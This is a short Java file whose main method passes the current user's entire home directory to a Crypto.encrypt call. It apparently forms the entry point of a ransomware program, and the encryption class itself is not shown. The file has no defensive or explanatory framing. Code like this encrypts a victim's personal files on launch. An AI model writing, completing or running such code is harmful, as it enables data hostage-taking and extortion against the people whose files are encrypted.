import java.io.File;

public class App {
    public static void main(String[] args) throws Exception {

        String nomSessionWindows = System.getProperty("user.home").replace("\\" , "\\\\");
        Crypto.encrypt(new File(nomSessionWindows));

    }
}

